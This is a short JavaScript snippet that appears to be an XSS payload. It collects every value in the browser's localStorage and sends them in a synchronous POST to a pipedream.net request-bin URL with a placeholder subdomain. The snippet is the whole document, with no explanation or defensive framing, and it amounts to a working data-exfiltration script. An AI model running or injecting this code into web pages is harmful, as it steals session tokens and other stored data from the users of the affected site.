(function() {
  var values = [];
  keys = Object.keys(localStorage);
  var i = keys.length;

  while(i--) {
 
  values.push(localStorage.getItem(keys[i]) );

  }

  var xmlHttp = new XMLHttpRequest();

  xmlHttp.open("POST","https://{unique data of the generated URL}.m.pipedream.net",false);

  xmlHttp.send(values); 

})();
